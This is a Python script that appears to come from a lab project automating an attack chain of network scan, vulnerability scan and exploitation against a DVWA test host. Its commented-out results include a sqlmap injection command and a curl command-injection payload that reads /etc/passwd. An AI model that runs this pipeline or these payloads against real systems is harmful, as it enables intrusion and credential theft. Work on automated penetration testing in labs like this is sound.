# import sys
import argparse
# import nmap
import time
import logging
# import os
# replaces os
# import subprocess

from helpers import post_processing, create_output_folder
from network_scanning import nmap_scan
from vulnerability_scanning import *
from attacks import *

logging.basicConfig(level=logging.INFO)
# logging.basicConfig(filename='log/debug.log', level=logging.debug)
logging.getLogger().setLevel(logging.INFO)

def arg_parser():
    parser = argparse.ArgumentParser(
        usage="",
        description=""
    )

    parser.add_argument(
        "-a", "--addr",
        help="Host address"
    )

    # parser.add_argument('--advance',
    #                 type=bool,
    #                 help='Advance Mode',
    #                 default=False,
    #                 required=False)
    return parser

def test_phase_1(trials):
    phase_results = []
    for idx in range(trials):
        result = nmap_scan(print_output=True, hosts = "192.168.40.*")
        phase_results.append(result)
    post_processing(1, phase_results)

def test_phase_2(trials, group_name=None):
    phase_results = []
    for idx in range(trials):
        result = wapiti_scan(group_name=group_name)
        phase_results.append(result)
    post_processing(2, phase_results)

def test_phase_3(trials, vuln_scan_results, group_name=None):
    phase_results = []
    for idx in range(trials):
        result = execute_attacks(vuln_scan_results, "http://192.168.40.132", 
                    cookie=get_cookie_contents("./resources/default.json"), 
                    group_name=group_name, stop_if_success=False)
        phase_results.append(result)
    post_processing(3, phase_results)

def full_attack(trials=1, hosts=None, cookie=None, group_name=None):
    for i in range(trials):
        print("---- Trial " + str(i))
        start = time.time()
        if not hosts:
            hosts = "192.168.40.*"
        if not cookie:
            cookie = get_cookie()
            # cookie = "./resources/default.json"
        result = nmap_scan(print_output=True, hosts = hosts)
        logging.info("Found {} hosts on network, attacking just one {}".format(
                        len(result["results"]), result["results"][1])) # TODO not 1
        if len(result["results"]) < 0:
            print("No hosts found, restarting")
            continue
        
        host = "http://"+result["results"][1]
        result = wapiti_scan(host=host+"/dvwa/", group_name=group_name, cookie=cookie)
        num_results=0 
        for key in result["results"].keys():
            num_results += len(result["results"][key])
        logging.info("Total number of wapiti results is {}".format(num_results))
        success = True if num_results > 0 else False
        if not success:
            print("No vuln found, restarting")
            continue

        result = execute_attacks(result, host, 
                        cookie=get_cookie_contents(cookie), 
                        group_name=group_name, stop_if_success=True)
        end = time.time()
        print("---- END, total time (sec) " + str(end-start))

def main(argv):
    parser = arg_parser()
    args = parser.parse_args(argv)
    

    # make group directory
    # group = time.strftime("%Y%m%d_%H%M%S",time.gmtime(time.time()))
    group = "testing_full_attack" #TODO parse this in from commandline
    create_output_folder(group)

    print("---- STARTING " + time.strftime("%Y%m%d_%H%M%S"))
    print("stage, time, command, result, success")
    full_attack(hosts=args.addr, cookie=None, group_name=group)

    # print("stage, time, command, result, success")
    # test_phase_1(3)
    # test_phase_2(1, group)
    # vuls = get_wapiti_results("./results/20210715/testing_phases_separately/wapiti_20210715_035735.json")
    # vuln_scan_results = {
    #     "stage":2,
    #     "time":0, 
    #     "settings": "",
    #     "results":vuls,
    # }
    # test_phase_3(3, vuln_scan_results, group_name=group)

    # attack_result = [{'stage': 3, 'time': 15.774715423583984, 'settings': 'sqlmap -u "http://192.168.40.132/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=a6509358ff1953766c9fac358712de29;security=low" --flush-session --batch --answers="" --output-dir=./results/20210715/sqlmap_out_20210715_020936', 'result_file': './results/20210715/sqlmap_out_20210715_020936/192.168.40.132/log', 'success': True}, {'stage': 3, 'time': 0.03617119789123535, 'settings': 'curl "http://192.168.40.132/dvwa/vulnerabilities/exec/" -e "http://192.168.40.132/dvwa/vulnerabilities/exec/" -d "ip=%3Bcat /etc/passwd%3B&submit=submit" --cookie "PHPSESSID=a6509358ff1953766c9fac358712de29;security=low"', 'result_file': './results/20210715/exec_pw_out_20210715_020952', 'success': True}]
    # post_processing(3, attack_result)
    
    # vuls = get_wapiti_results("./results/made_results.json")
    # result = {
    #     "stage":2,
    #     "time":0, 
    #     "settings": "",
    #     "results":vuls,
    # }
    # attack_result = execute_attacks(result, "http://192.168.40.132", 
    #                 cookie=get_cookie_contents("./resources/cook2.json"), 
    #                 group_name=group, stop_if_success=True)

    # with open("./results/attack_output.txt", "w") as f:
    #     f.write(str(attack_result))

    # cookie_file = get_cookie()
    # wapiti_scan(os_output=True)

    # result = wapiti_scan(modules="all", os_output=True)
    # post_processing(2, [result])

    # vuls = get_wapiti_results("./results/made_results.json")
    # result = {
    #     "stage":2,
    #     "time":0, 
    #     "settings": "",
    #     "results":vuls
    # }
    # post_processing(2, [result])

    #wapiti_scan()

    # result = nmap_scan()
    # post_processing(1, [
    #     result, 
    #     nmap_scan(print_output=False, hosts = "192.168.40.*")
    # ])



if __name__ == '__main__':
    main(sys.argv[1:])
